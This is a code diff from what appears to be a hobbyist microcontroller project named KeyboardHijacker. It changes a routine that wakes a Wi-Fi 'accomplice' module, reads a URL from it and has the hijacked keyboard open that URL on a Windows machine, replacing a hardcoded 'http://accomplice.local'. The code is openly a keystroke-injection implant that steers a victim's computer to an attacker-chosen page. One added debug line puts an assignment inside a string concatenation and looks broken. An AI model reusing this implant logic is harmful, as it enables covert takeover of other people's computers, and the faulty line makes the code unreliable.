@@ -47,27 +47,29 @@ void KeyboardHijacker::TRANSMIT_AFTER_HIJACK()
 
                         if(DarkJunction::STATE == DarkJunction_STATE_DISCONNECTED)
                         {
-                            // WAKE UP ACCOMPLICE !
-                            MODULE_ACCOMPLICE_WAKEUP();
+                            // WAKE UP WIFI_ACCOMPLICE !
+                            WIFI_ACCOMPLICE_WAKEUP();
 
-                            // if ACCOMPLICE all ready, it signals.
+                            // if WIFI_ACCOMPLICE all ready, it signals.
                             if(DarkJunction::detectHIGHForXXms(15000, false))
                             {
                                 DarkJunction::BOOT();
                                 DarkJunction::S3R14L_download();
 
-                                if(isDEBUG) Serial.println("\nAccomplice Says : " + DarkJunction::getMessage() + "\n");
+                                static String url = "";
+                                url = DarkJunction::getMessage();
 
-                                HIJACKER_OPENS_WEBPAGE__OS_WINDOWS("http://accomplice.local");
+                                HIJACKER_OPENS_WEBPAGE__OS_WINDOWS(url);
+                                if(isDEBUG) Serial.println("\nWIFI_ACCOMPLICE url : " + url =DarkJunction::getMessage() + "\n");
                             }
-                            // if ACCOMPLICE's WIFI is not connected to NET yet, please connect...
+                            // if WIFI_ACCOMPLICE's WIFI is not connected to NET yet, please connect...
                             else
                             {
-                                HIJACKER_OPENS_NOTEPAD__OS_WINDOWS("PLEASE CONNECT ACCOMPLICE TO NET PLEASE");
+                                HIJACKER_OPENS_NOTEPAD__OS_WINDOWS("PLEASE CONNECT WIFI_ACCOMPLICE TO NET PLEASE");
                             }
                         }
                         else
-                        {   DarkJunction::SHUTDOWN(); MODULE_ACCOMPLICE_PUTTOSLEEP();   }
+                        {   DarkJunction::SHUTDOWN(); WIFI_ACCOMPLICE_PUTTOSLEEP();   }
                     }
                     isActivatedKeyEvent=false; key=KEY_NONE;
                 }
